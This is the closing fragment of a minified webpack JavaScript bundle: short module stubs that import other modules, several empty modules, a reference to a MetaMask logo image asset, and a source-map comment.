    "981b": function(t, e, s) {
        "use strict";
        s("d105")
    },
    b9a0: function(t, e, s) {
        "use strict";
        s("4e7c")
    },
    ba67: function(t, e, s) {
        t.exports = s.p + "img/metamask.023762b6.png"
    },
    c7ce: function(t, e, s) {
        "use strict";
        s("f24f")
    },
    cccb: function(t, e, s) {
        "use strict";
        s("dee6")
    },
    d105: function(t, e, s) {},
    dee6: function(t, e, s) {},
    f24f: function(t, e, s) {}
});
//# sourceMappingURL=app.a58fd70d.js.map
